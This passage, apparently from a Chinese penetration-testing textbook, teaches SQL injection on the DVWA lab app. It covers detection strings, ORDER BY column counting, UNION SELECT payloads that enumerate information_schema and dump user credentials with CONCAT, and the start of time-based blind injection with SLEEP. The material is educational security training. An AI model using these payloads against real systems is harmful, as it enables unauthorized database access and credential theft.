

接下来，尝试一个恒假的：2' and '1'='2：

![](img/6b6e557533100c0e47951d0e5e14c4ee_216_0.png)

从浏览器地址栏可以看到，ID 的提交是通过 GET 请求完成的。对于假条件，响应为空文本而不是用户的详细信息。因此，即使 ID=2 的用户存在，句子的第二个条件也是假的，结果为空。这表明你可以将 SQL 代码注入到查询中并可能从数据库中提取信息。

以下其他有用的测试字符串可能有助于你识别 SQL 注入：

+   - **对数值输入的算术运算**：包括 2+1、-1 和 0+1。
+   - **字母值**：当期望数字时使用这些（a、b、c、...）。
+   - **分号 (;)**：在大多数 SQL 实现中，分号表示句子的结束。你可以注入一个分号后跟另一个 SQL 句子，例如 SLEEP 或 WAITFOR，然后比较响应时间。如果它与你提供的暂停一致，则存在注入漏洞。
+   - **注释**：注释标记（#、//、/*、--）使解释器忽略注释后的所有内容。通过在有效值后注入这些，你应该得到与仅提交该值时不同的响应。
+   - **双引号 (")**：这可以代替撇号或单引号来分隔字符串。

+   - **通配符、字符 %（百分号）和 _（下划线）：** 这些也可以在 WHERE 条件中使用，因此如果代码存在漏洞，你可以注入它们；% 表示所有字符串，_ 表示任意一个字符。例如，如果使用 LIKE 运算符而不是 =，如以下 PHP 字符串连接中，如果我们提交百分号字符（%），你将获得所有用户作为结果：

```
"SELECT first_name, last_name FROM users WHERE first_name LIKE '$name'"
```

或者，如果你提交类似 "Ali__"（两个下划线）的内容，你可能会得到诸如 "Alice"、"Aline"、"Alica"、"Alise" 和 "Alima" 等结果。

+   - **UNION 运算符：** 这用于在 SQL 中合并两个查询的结果。作为条件，两个查询的结果需要具有相同数量的列。因此，如果你有一个返回三个的易受攻击的查询，像上面所示的那样（选择两列），并注入类似 UNION SELECT 1, 2 的内容，你将得到有效结果，或者如果你注入 UNION SELECT 1, 2, 3，你将得到错误。如果结果相同，无论列数多少，或差异不一致，该输入可能不受攻击。

## 使用 SQL 注入提取数据

为了利用 SQL 注入漏洞并从数据库中提取数据，你首先需要了解查询是如何构建的，这样你就知道如何以及在哪里注入你的有效载荷。

发现存在注入漏洞有助于你弄清楚 WHERE 条件是如何制定的。你还需要知道选择了多少列以及哪些列实际返回给客户端。

要获取列数，你可以使用 ORDER BY。从在有效值后注入 ORDER BY 1 开始，按第一行排序结果，然后按第二行，依此类推，直到你因尝试使用不存在的行号对结果排序而收到错误：

![](img/6b6e557533100c0e47951d0e5e14c4ee_218_0.png)

正如前面的屏幕截图所示，当按第 3 列排序时查询失败，这告诉你它只返回两列。另外，请注意在地址栏中，你的注入是 2' order by 3 -- '，你需要添加注释以使解释器忽略查询的其余部分，因为在 SQL 中 ORDER 必须始终位于句子的末尾。你还需要在注释前后添加空格（浏览器在地址栏中用 + 替换它们）并在末尾关闭单引号以防止语法错误。

现在你知道查询返回两列，要查看它们在响应中的呈现方式，请使用 UNION。通过提交 2' union select 1,2 -- '，你会看到第一列是名字，第二列是姓氏：

![](img/6b6e557533100c0e47951d0e5e14c4ee_218_1.png)

现在你可以开始从数据库中提取信息。

## 获取基本环境信息

为了从数据库中提取信息，你需要知道要查找什么：数据库有哪些？我们的用户可以访问其中哪些？有哪些表，它们有哪些列？这是你需要向服务器询问的初始信息，以便能够查询你希望获得的数据：

![](img/6b6e557533100c0e47951d0e5e14c4ee_219_0.png)

使用 DVWA 示例，鉴于你只有两列来获取信息，首先询问数据库名称和应用程序用于连接到 DBMS 的用户。

这是使用 MySQL 中预定义的 database() 和 user() 函数完成的：

## 漏洞：SQL 注入

用户 ID：

```
ID: 2' union SELECT schema_name,2 FROM information_schema.schemata -- '
First name: Gordon
Surname: Brown
```

```
ID: 2' union SELECT schema_name,2 FROM information_schema.schemata -- '
First name: information_schema
Surname: 2
```

```
ID: 2' union SELECT schema_name,2 FROM information_schema.schemata -- '
First name: dvwa
Surname: 2
```

你也可以通过注入以下内容来请求服务器上的数据库列表：

```
2' union SELECT schema_name,2 FROM information_schema.schemata -- '
```

## 漏洞：SQL 注入

用户 ID：

```
ID: 2' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema = 'dvwa' -- '
First name: Gordon
Surname: Brown
```

```
ID: 2' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema = 'dvwa' -- '
First name: guestbook
Surname: 2
```

```
ID: 2' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema = 'dvwa' -- '
First name: users
Surname: 2
```

information_schema 是包含 MySQL 所有配置和数据库定义信息的数据库，因此 dvwa 应该是对应目标应用程序的数据库。现在让我们查询该数据库中包含的表：

```
2' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema = 'dvwa' -- '
```

正如屏幕截图所示，我们正在查询 information_schema.tables 表中定义的所有表的表名，其中 table_schema（或数据库名称）为 'dvwa'。从那里，你可以获得包含用户信息表的名称，你也可以询问其列和每列的类型：

```
2' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema = 'dvwa' and table_name = 'users' --'
```

你应该在每个请求中选择一个或两个信息片段，因为你只有两个字段来显示信息。SQL 提供了 CONCAT 函数，它连接两个或多个字符串。你可以使用它将多个字段放在单个值中。你将使用 CONCAT 在单个查询中提取用户 ID、名字和姓氏、用户名和密码：

```
2' union select concat(user_id,'-',first_name,' ',last_name),concat(user,':',password) from dvwa.users -- '
```

![](img/6b6e557533100c0e47951d0e5e14c4ee_221_0.png)

## 盲 SQL 注入

到目前为止，我们已经识别并利用了一个常见的 SQL 注入漏洞，其中请求的信息显示在服务器的响应中。然而，还有另一种类型的 SQL 注入，即服务器响应不会揭示实际的详细信息，无论是否存在。这称为盲 SQL 注入。

要检测盲 SQL 注入，你需要形成得到是或否响应的查询。这意味着查询在结果为正或负时以一致的方式响应，以便你可以区分两者。这可以基于响应的内容、响应代码或某些注入命令的执行。在最后一类中，最常见的方法是注入暂停命令并根据响应时间检测真或假（基于时间的注入）。为了澄清这一点，让我们用 DVWA 做一个快速练习。你还将使用 Burp Suite 来促进请求的重新提交。

![](img/6b6e557533100c0e47951d0e5e14c4ee_222_0.png)

在基于时间的注入中，形成一个查询，旨在在结果为真时暂停处理 N 秒，如果结果为假，则不暂停执行查询。为此，在 MySQL 中使用 SLEEP (N) 函数，在 MS SQL Server 中使用 WAITFOR DELAY '0:0:N' 函数。如果服务器需要这么长时间来响应，结果为真。

首先，转到 SQL Injection (Blind)。你会看到与另一个 SQL 注入练习相同的 User ID 文本框。如果你提交一个数字，它会显示对应用户的名字和姓氏。这次，然而，如果你提交一个撇号或单引号，它会显示空响应。但如果你提交 1' ' 会怎样？它显示用户 1 的信息；因此它是可注入的：

![](img/6b6e557533100c0e47951d0e5e14c4ee_222_1.png)

